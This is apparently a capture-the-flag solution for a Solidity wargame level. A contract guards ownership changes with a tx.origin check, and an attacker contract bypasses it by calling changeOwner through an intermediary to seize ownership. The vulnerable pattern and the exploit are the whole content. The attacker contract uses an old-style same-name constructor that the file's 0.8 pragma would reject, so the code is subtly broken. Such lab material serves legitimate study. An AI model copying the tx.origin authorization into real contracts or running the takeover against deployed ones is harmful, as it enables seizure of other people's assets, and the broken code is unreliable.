// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

import "./Telephone.sol";

contract TelephonePoc {
    
    Telephone phone;
    
    function TelephonePoc(address aimAddr) public {
        phone = Telephone(aimAddr);
    }
    
    function attack(address _owner) public{
        phone.changeOwner(_owner);
    }
}